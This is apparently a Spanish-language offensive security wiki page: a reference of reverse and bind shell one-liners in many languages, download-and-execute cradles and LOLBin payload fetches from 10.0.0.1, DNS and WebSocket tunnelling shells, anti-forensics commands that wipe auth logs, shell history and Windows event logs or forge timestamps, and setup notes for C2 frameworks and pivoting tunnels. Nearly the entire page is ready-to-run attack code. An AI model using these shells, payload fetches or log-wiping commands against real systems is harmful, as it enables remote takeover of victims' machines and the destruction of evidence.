- **[covenant](../raw/r3v3rs3-sh3lls.md#covenant)**: https://github.com/cobbr/[covenant](../raw/r3v3rs3-sh3lls.md#covenant)
- **Mythic**: https://github.com/its-a-feature/Mythic
- **Donut**: https://github.com/TheWover/donut
- **Shellter**: https://www.shellterproject.com/
- **Veil**: https://github.com/Veil-Framework/Veil
- **[ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng**: https://github.com/nicocha30/[ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng
- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **dnscat2**: https://github.com/iagox86/dnscat2
- **Reverse Shell Generator**: https://www.revshells.com/
## 100+ [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) One-Liners (completo)

### Bash

```bash
# Estandar
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Con exec y file descriptor
exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Con file descriptor explicito
0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196

# UDP (si TCP filtrado)
sh -i >& /dev/udp/10.0.0.1/4444 0>&1

# Sin /dev/tcp (compilacion bash sin soporte)
bash -c 'sh -i -c "exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read l; do \$l 2>&5 >&5; done"'
```

### sh / dash

```bash
# sh generico
sh -i >& /dev/tcp/10.0.0.1/4444 0>&1

# dash (Debian/Ubuntu default)
dash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### zsh

```bash
zsh -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### ksh

```bash
ksh -c 'ksh -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### ash (BusyBox)

```bash
# BusyBox ash no tiene /dev/tcp, usar netcat
nc 10.0.0.1 4444 -e /bin/sh
```

### Python2

```python
python2 -c "
import socket,subprocess;
s=socket.socket();
s.connect(('10.0.0.1',4444));
subprocess.call(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)
"
```

### Python3

```python
python3 -c "
import socket,subprocess;
s=socket.socket();
s.connect(('10.0.0.1',4444));
subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
"

# Version pty (mas estable)
python3 -c "
import socket,pty,os;
s=socket.socket();
s.connect(('10.0.0.1',4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn('/bin/sh')
"

# Reconexion automatica
python3 -c "
import socket,subprocess,os,time
while True:
    try:
        s=socket.socket()
        s.connect(('10.0.0.1',4444))
        subprocess.call(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)
        s.close()
    except:
        time.sleep(5)
"

# Windows con cmd.exe
python -c "
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.0.0.1',4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call([os.environ['COMSPEC'],'/k'])
"
```

### Perl

```perl
perl -e '
use Socket;
$i="10.0.0.1";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in($p,inet_aton($i)));
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
'

# Con IO::Socket
perl -MIO::Socket::INET -e '
$s=new IO::Socket::INET(PeerAddr=>"10.0.0.1:4444");
STDIN->fdopen($s,r);
$s->autoflush(1);
print $s "Connected\n";
while(<$s>){chomp;system $_}
'
```

### PHP

```php
php -r '\$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '\$s=fsockopen("10.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '\$s=fsockopen("10.0.0.1",4444);\$proc=proc_open("/bin/sh -i",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'
```

### Ruby

```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read};end'

ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1",4444);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l.chomp!;IO.popen(l,"r"){|fd|c.print fd.read}}'
```

### Node.js

```javascript
node -e '
var net=require("net");
var sh=require("child_process").spawn("/bin/sh",[]);
var c=new net.Socket();
c.connect(4444,"10.0.0.1",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
'

// Con reconexion automatica
node -e '
var net=require("net");
function connect(){
  var c=new net.Socket();
  c.connect(4444,"10.0.0.1",function(){
    var sh=require("child_process").spawn("/bin/sh",[]);
    c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);
  });
  c.on("close",function(){setTimeout(connect,5000)});
}
connect();
'
```

### Lua

```lua
lua -e '
local host,port="10.0.0.1",4444
local sock=require("socket")
local tcp=sock.tcp()
tcp:connect(host,port)
while true do
  local cmd,status,partial=tcp:receive()
  if(cmd) then
    local f=io.popen(cmd,"r")
    local s=f:read("*a")
    tcp:send(s)
    f:close()
  end
  tcp:send("\n> ")
end
tcp:close()
'
```

### Golang (compilado)

```go
package main
import (
    "net"
    "os/exec"
    "io"
)
func main() {
    conn,_ := net.Dial("tcp","10.0.0.1:4444")
    cmd := exec.Command("/bin/sh")
    stdin,_ := cmd.StdinPipe()
    stdout,_ := cmd.StdoutPipe()
    stderr,_ := cmd.StderrPipe()
    go io.Copy(stdin,conn)
    go io.Copy(conn,stdout)
    go io.Copy(conn,stderr)
    cmd.Run()
}
```

### Rust (compilado)

```rust
use std::process::{Command,Stdio};
use std::io::{Read,Write};
use std::net::TcpStream;

fn main() {
    let mut stream = TcpStream::connect("10.0.0.1:4444").unwrap();
    let mut child = Command::new("/bin/sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();
    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = child.stdout.take().unwrap();
    let mut buffer = [0; 1024];
    loop {
        let n = stream.read(&mut buffer).unwrap();
        if n == 0 { break; }
        stdin.write_all(&buffer[..n]).unwrap();
        let m = stdout.read(&mut buffer).unwrap();
        stream.write_all(&buffer[..m]).unwrap();
    }
}
```

### Nim (compilado)

```nim
import net, osproc

let socket = newSocket()
socket.connect("10.0.0.1", Port(4444))
let (process, _) = startCmd("/bin/sh")
while true:
    let cmd = socket.recvLine()
    let output = execCmdEx(cmd).output
    socket.send(output)
```

### C (compilado)

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("10.0.0.1");
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    char *argv[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

### Java

```java
public class Reverse {
    public static void main(String[] args) throws Exception {
        java.net.Socket s = new java.net.Socket("10.0.0.1",4444);
        java.lang.Process p = java.lang.Runtime.getRuntime().exec("/bin/sh -i");
        new Thread(() -> {
            try {
                java.io.InputStream pi = p.getInputStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = pi.read(buf)) != -1) s.getOutputStream().write(buf,0,n);
            } catch(Exception e) {}
        }).start();
        new Thread(() -> {
            try {
                java.io.OutputStream po = p.getOutputStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = s.getInputStream().read(buf)) != -1) po.write(buf,0,n);
            } catch(Exception e) {}
        }).start();
        p.waitFor();
        s.close();
    }
}
```

### Groovy

```groovy
s = new java.net.Socket("10.0.0.1",4444)
p = new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start()
p.inputStream.eachLine { l -> s.outputStream << "$l\n" }
s.inputStream.eachLine { l -> p.outputStream << "$l\n" }
```

### [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "\$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS> ';\$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$c.Close()"

# Con SSL
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "\$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);\$s=\$c.GetStream();\$ssl=New-Object Net.Security.SslStream(\$s,\$false,(\$true -as [Net.Security.RemoteCertificateValidationCallback]));\$ssl.AuthenticateAsClient('10.0.0.1',\$null,'Tls12',\$false);[byte[]]\$b=0..65535|%{0};while((\$i=\$ssl.Read(\$b,0,\$b.Length)) -ne 0){\$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sbt=([text.encoding]::ASCII).GetBytes(\$sb+'PS> ');\$ssl.Write(\$sbt,0,\$sbt.Length);\$ssl.Flush()};\$c.Close()"

# Download cradle
powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"

# Base64 encoded
powershell -e <BASE64>

# Con WMI
wmic process call create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"...`""
```

### cmd.exe (Windows)

```cmd
# Con certutil
certutil -urlcache -split -f http://10.0.0.1/shell.exe shell.exe && shell.exe

# Con bitsadmin
bitsadmin /transfer job /download /priority high http://10.0.0.1/shell.exe %temp%\shell.exe && %temp%\shell.exe

# Con cscript (VBS)
cscript //nologo shell.vbs

# Con mshta (HTA)
mshta http://10.0.0.1/shell.hta
```

### cscript (VBScript)

```vb
' shell.vbs
Set Shell = CreateObject("Wscript.Shell")
Set Sock = CreateObject("MSXML2.XMLHTTP")
Do While True
    Sock.open "GET", "http://10.0.0.1:8080/command", False
    Sock.send
    If Sock.Status = 200 Then
        cmd = Sock.responseText
        If cmd <> "" Then
            output = Shell.Exec(cmd).StdOut.ReadAll()
            Set Send = CreateObject("MSXML2.XMLHTTP")
            Send.open "POST", "http://10.0.0.1:8080/result", False
            Send.send output
        End If
    End If
    WScript.Sleep 5000
Loop
```

### mshta (HTA)

```html
<!-- shell.hta -->
<html><head><title>Shell</title><hta:application id="shell" /></head>
<body>
<script language="VBScript">
Set Shell = CreateObject("Wscript.Shell")
Set Sock = CreateObject("MSXML2.XMLHTTP")
Do While True
    Sock.open "GET", "http://10.0.0.1:8080/c", False
    Sock.send
    If Sock.Status = 200 And Sock.responseText <> "" Then
        Shell.Run Sock.responseText, 0, False
    End If
    WScript.Sleep 5000
Loop
</script>
</body></html>
```

### regsvr32 ([com](../raw/w1n-s9bsyst3ms.md#com) Scriptlet)

```bash
# Atacante: servir SCT file
regsvr32 /s /n /u /i:http://10.0.0.1/evil.sct scrobj.dll
```

### msxsl

```bash
msxsl.exe http://10.0.0.1/evil.xml
```

### csc (C# compilado)

```bash
# Compilar y ejecutar C# en memoria
csc /out:shell.exe shell.cs && shell.exe
```

```csharp
// shell.cs
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class Shell {
    static void Main() {
        using (var c = new TcpClient("10.0.0.1", 4444))
        using (var s = c.GetStream()) {
            var p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            s.CopyTo(p.StandardInput.BaseStream);
            p.StandardOutput.BaseStream.CopyTo(s);
        }
    }
}
```

### installutil (drophijack)

```bash
# Usar InstallUtil para ejecutar un .NET assembly como payload
installutil /logfile= /silent /U shell.dll
```

### rundll32

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://10.0.0.1/shell.sct")
```

## Bind Shells - One-Liners completos

### Bash [bind shell](../raw/r3v3rs3-sh3lls.md#bind-shells)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

### [netcat](../raw/r3v3rs3-sh3lls.md#netcat) bind

```bash
nc -lvnp 4444 -e /bin/sh
```

### [socat](../raw/r3v3rs3-sh3lls.md#socat) bind

```bash
socat TCP-L:4444,fork,reuseaddr EXEC:/bin/sh
```

### [python](../raw/pyth0n-f0r-h4ck1ng.md) bind

```python
python3 -c "
import socket,subprocess,os;
s=socket.socket();
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);
s.bind(('0.0.0.0',4444));
s.listen(5);
while True:
    c,a=s.accept();
    os.dup2(c.fileno(),0);
    os.dup2(c.fileno(),1);
    os.dup2(c.fileno(),2);
    subprocess.call(['/bin/sh','-i'])
"
```

### Perl bind

```perl
perl -e '
use Socket;
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
bind(S,sockaddr_in($p,INADDR_ANY));
listen(S,5);
while(accept(C,S)){
  open(STDIN,">&C");
  open(STDOUT,">&C");
  open(STDERR,">&C");
  exec("/bin/sh -i");
  close(C);
}
'
```

### PHP bind

```php
php -r '
set_time_limit(0);
$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
socket_bind($s,"0.0.0.0",4444);
socket_listen($s,5);
while($c=socket_accept($s)){
  while($d=socket_read($c,1024)){
    $o=shell_exec($d);
    socket_write($c,$o,strlen($o));
  }
  socket_close($c);
}
'
```

### [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) bind (Windows)

```powershell
powershell -Command "\$l=New-Object Net.Sockets.TcpListener(0,4444);\$l.Start();\$c=\$l.AcceptTcpClient();\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sbt=([text.encoding]::ASCII).GetBytes(\$sb);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()}"
```

## WebSocket Reverse Shells

### Servidor [python](../raw/pyth0n-f0r-h4ck1ng.md) WebSocket

```python
# pip install websockets
import asyncio
import websockets
import subprocess

async def handle(websocket, path):
    async for message in websocket:
        result = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
        await websocket.send(result.decode())

start_server = websockets.serve(handle, "0.0.0.0", 4444)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
```

### Cliente Node.js WebSocket

```javascript
const WebSocket = require('ws');
const { exec } = require('child_process');
const ws = new WebSocket('ws://10.0.0.1:4444');
ws.on('open', () => console.log('Connected'));
ws.on('message', (cmd) => {
    exec(cmd.toString(), (err, stdout, stderr) => {
        ws.send(stdout + stderr);
    });
});
ws.on('close', () => setTimeout(() => process.exit(), 5000));
```

### Cliente PHP WebSocket

```php
<?php
$ws = new WebSocket\Client("ws://10.0.0.1:4444");
$ws->text("connected");
while (true) {
    $cmd = $ws->receive();
    if ($cmd) {
        $output = shell_exec($cmd);
        $ws->text($output);
    }
}
?>
```

## [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Tunneling Shells

### iodine setup

```bash
# Servidor (atacante con dominio propio)
sudo iodined -f -c -P password 10.0.0.1 t1.tudominio.com

# Cliente (victima)
sudo iodine -f -P password 10.0.0.1 t1.tudominio.com -r

# Despues del tunel, SSH sobre DNS
ssh user@10.0.0.1
```

### dnscat2 setup

```bash
# Servidor
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo ruby dnscat2.rb tusubdominio.ejemplo.com

# Cliente
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
./dnscat2 --dns tusubdominio.ejemplo.com
```

### dns2tcp

```bash
# Servidor
dns2tcpd -f /etc/dns2tcpd.conf -d 2
# /etc/dns2tcpd.conf:
# listen = 127.0.0.1
# port = 53
# domain = tunnel.tudominio.com
# key = password123
# resource = ssh:127.0.0.1:22

# Cliente
dns2tcpc -r ssh -z tunnel.tudominio.com -k password123 -l 8888 10.0.0.1
ssh user@localhost -p 8888
```

### DNS TXT Record [payload](../raw/m3t4spl01t.md#payloads) Tunneling

```bash
# Atacante: configurar DNS server con payload en TXT record
# Servir shellcode en base64 en registro TXT

# Victima: consultar TXT record y decodificar
dig +short TXT payload.tudominio.com | base64 -d | sh
```

## Anti-Forensics for Shells

### Log Deletion

```bash
# Bash history
unset HISTORYFILE
history -c
rm -f ~/.bash_history ~/.zsh_history ~/.sh_history

# Auth logs
rm -f /var/log/auth.log /var/log/secure
rm -f /var/log/wtmp /var/log/btmp /var/log/lastlog
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
> /var/log/maillog

# Journalctl
journalctl --rotate
journalctl --vacuum-time=1s

# Windows events
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### Timestamp Manipulation

```bash
# Cambiar timestamps de archivos
touch -t 202001010000 shell.exe
touch -r /etc/passwd shell.exe

# Cambiar timestamp de directorio actual
touch -t $(date -d "1 year ago" +%Y%m%d%H%M.%S) .

# Windows
# (Get-Item shell.exe).LastWriteTime = (Get-Date "2020-01-01")
```

### Fileless Payloads

```bash
# PowerShell fileless
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/ps.ps1')"

# Python fileless
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.0.0.1/payload.py').read())"

# PHP fileless
php -r "eval(file_get_contents('http://10.0.0.1/payload.php'));"
```

### LOLBins (Living Off The Land)

```bash
# bitsadmin
bitsadmin /transfer job /download /priority high http://10.0.0.1/payload.exe C:\Windows\Temp\p.exe && C:\Windows\Temp\p.exe

# certutil
certutil -urlcache -split -f http://10.0.0.1/payload.exe payload.exe

# mshta
mshta http://10.0.0.1/payload.hta

# msiexec
msiexec /q /i http://10.0.0.1/payload.msi

# regsvr32
regsvr32 /s /n /u /i:http://10.0.0.1/payload.sct scrobj.dll

# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://10.0.0.1/payload.sct");window.close();

# cscript / wscript
cscript //nologo http://10.0.0.1/payload.vbs

# powershell
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/ps.ps1')"

# wmic
wmic os get /format:"http://10.0.0.1/payload.xsl"

# cmstp
cmstp /s http://10.0.0.1/payload.inf

# pcalua
pcalua -a http://10.0.0.1/payload.exe
```

## [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) Frameworks Profundidad

### Sliver - Profile Creation and Staging

```bash
# Crear perfil de implant personalizado
sliver > profiles new --mtls 10.0.0.1 --save profile1 --skip-symbols

# Staging (payload mas pequeno que descarga el stage)
sliver > stage-listener --url tcp://10.0.0.1:8080 --profile profile1

# Ejecutar en la victima
stager.exe

# Working Stages:
# - --http / https: HTTP polling
# - --mtls: mTLS cifrado mutuo
# - --dns: DNS tunneling
# - --wg: WireGuard

# Listeners
sliver > mtls --lport 443
sliver > https --lport 443 --domain target.com
sliver > dns --lport 53

# Multiplayer mode
sliver-server operator --name mi_operador --lhost 10.0.0.1
sliver-client import operador.cfg
```

### Havoc - Demon Creation

```bash
# En Havoc client, crear nuevo Demon
# Profile -> Demon -> New
# Configurar:
#   Listener: HTTPS on 0.0.0.0:443
#   Host: 10.0.0.1
#   Sleep: 5-10s (jitter 30%)
#   Kill Date: None
#   Working Hours: 9-18
#   User Agent: Mozilla/5.0...

# Generar payload
# Build -> x64 EXE

# Opciones de evasion
# - Sleep obfuscation (Ekko / Gargoyle)
# - Indirect syscalls
# - API unhooking
# - ETW patching
```

### [covenant](../raw/r3v3rs3-sh3lls.md#covenant) - Grunt Types

```bash
# Tipos de Grunt en Covenant:
# - HTTP: Conexion HTTP/S standard
# - SMB: Pivot a traves de SMB named pipes
# - Bridge: Proxy a traves de otro Grunt
# - InstallUtil: .NET assembly via InstallUtil
# - MSBuild: XML tasks file
# - Wmic: XSL script via wmic

# Cada Grunt tiene opciones de:
# - ValidateCert (SSL pinning)
# - UseCertPinning
# - ConnectAttempts
# - Delay (intervalo entre check-ins)
# - JitterPercent
# - KillDate
# - DotNetVersion
```

### Mythic - Agent Creation

```bash
# Agentes disponibles:
# - Apollo (C#, Windows)
# - Poseidon (Swift, macOS)
# - Atlas (C, Linux cross-platform)
# - Hermes (Python, cross-platform)

# Crear payload desde UI de Mythic
# Seleccionar agente -> configurar C2 profile -> generar

# C2 Profiles disponibles:
# - http (HTTP poll)
# - smb (SMB named pipe)
# - dns (DNS txt records)
# - websocket (WS polling)
# - dynamic (multi-protocol)

# Callback functions:
# - tasking: recibir comandos
# - output: enviar resultados
# - checkin: heartbeat
```

### PoshC2 - [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Session

```bash
# Instalar
git clone https://github.com/nettitude/PoshC2.git
cd PoshC2 && ./Install.sh

# Configurar
cp poshConfig.xml poshConfig_edit.xml
# Editar: C2Server, Port, UserAgent, etc.

# Iniciar servidor
python3 poshServer.py

# Iniciar implantador
python3 posh.py

# Generar payload:
# - powershell reflection
# - cscript/vbs
# - hta
# - exe

# Modulos:
# - mimikatz
# - powerview
# - bloodhound
# - empire
```

### [empire](../raw/r3v3rs3-sh3lls.md#empire) - PowerShell and [python](../raw/pyth0n-f0r-h4ck1ng.md) Agents

```bash
# Instalar
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire && ./setup/install.sh

# Iniciar
sudo python3 empire

# Listeners
(Empire) > listeners
(Empire) > uselistener http
(Empire) > set Host http://10.0.0.1:8080
(Empire) > set Port 8080
(Empire) > execute

# Stagers
(Empire) > usestager windows/launcher_bat
(Empire) > set Listener http
(Empire) > execute

# Agentes
(Empire) > agents
(Empire) > interact AGENT_ID
(Empire) > shell whoami
(Empire) > mimikatz

# Modulos utiles:
# - powershell/privesc/powerup
# - situational_awareness/host/winenum
# - collection/browser_data
# - exfiltration/email
```

## Egress Filtering Bypass Avanzado

### [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) over [https](../raw/r3d3s-f0nd4m3nt0s.md#https) (DoH)

```bash
# Usar DNS over HTTPS para tunelizar
# DoH corre en puerto 443, parece trafico HTTPS normal

curl -H "accept: application/dns-json" "https://dns.google/resolve?name=payload.mydomain.com&type=TXT"

# Herramientas: dnsoverhttps, dns2tcp over DoH
```

### Cloudflare Workers [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells)

```javascript
// Cloudflare Worker como proxy reverso
// Atacante: desplegar worker en cloudflare
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Recibir comando del atacante via URL param
  const url = new URL(request.url);
  const cmd = url.searchParams.get('cmd') || 'whoami';

  // Enviar comando a la victima
  const response = await fetch('http://VICTIM_IP:8080/exec', {
    method: 'POST',
    body: cmd
  });

  return new Response(await response.text(), {
    headers: { 'Content-Type': 'text/plain' }
  });
}
```

### [aws](../raw/cl0ud-h4ck1ng.md#aws) Lambda Reverse Shell

```python
# AWS Lambda function como C2
import json
import urllib.request

def lambda_handler(event, context):
    # Recibir output de la victima
    if 'output' in event:
        print(f"[Result] {event['output']}")

    # Devolver comando a ejecutar
    return {
        'statusCode': 200,
        'body': json.dumps({'cmd': 'whoami'})
    }
```

## [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting) Tunnels Detallado

### [chisel](../raw/l1n9x-pr1v3sc.md#chisel) (SOCKS5 sobre [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/WS)

```bash
# Servidor (atacante)
chisel server --port 8080 --reverse --socks5

# Cliente (victima)
chisel client http://10.0.0.1:8080 R:1080:socks

# Ahora usa proxychains con socks5 127.0.0.1:1080
proxychains nmap -sT -Pn 10.10.10.0/24
```

### [ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng (Layer 2/3 Tunnel)

```bash
# Proxy (atacante)
sudo ip tuntap add name ligolo mode tun
sudo ip link set ligolo up
sudo ip addr add 240.0.0.1/32 dev ligolo
./proxy -selfcert

# Agent (victima)
./agent -connect 10.0.0.1:11601 -ignore-cert

# En sesion:
ligolo-ng > session
ligolo-ng > ifconfig
ligolo-ng > start
sudo ip route add 10.10.10.0/24 dev ligolo
```

### FRP (Fast Reverse [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy))

```bash
# Server (atacante) - frps.ini
[common]
bind_port = 7000

# Cliente (victima) - frpc.ini
[common]
server_addr = 10.0.0.1
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000

# Conectar via SSH a traves del tunel
ssh user@10.0.0.1 -p 6000
```

### sshuttle ([vpn](../raw/4n0n1m4t0.md#vpn) sobre SSH)

```bash
# VPN sobre SSH - no requiere config en servidor
sshuttle -r user@10.0.0.1 10.10.10.0/24

# Ahora todo el trafico a 10.10.10.0/24 va por SSH
ssh user@10.10.10.50
```

## Shell Stabilization - Metodos avanzados

### [socat](../raw/r3v3rs3-sh3lls.md#socat) TTY completo

```bash
# Atacante
socat file:`tty`,raw,echo=0 TCP-L:4444

# Victima
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

### [python](../raw/pyth0n-f0r-h4ck1ng.md) PTY paso a paso

```bash
# En shell basica
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z para background

# En terminal local
stty raw -echo; fg

# En shell remota
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 24 columns 80
```

### Con screen/tmux

```bash
# Si screen esta instalado
screen -S revive
# Ctrl+A D para desprender
screen -r revive

# Con tmux
tmux new-session -s revive
# Ctrl+B D para desprender
tmux attach -t revive
```



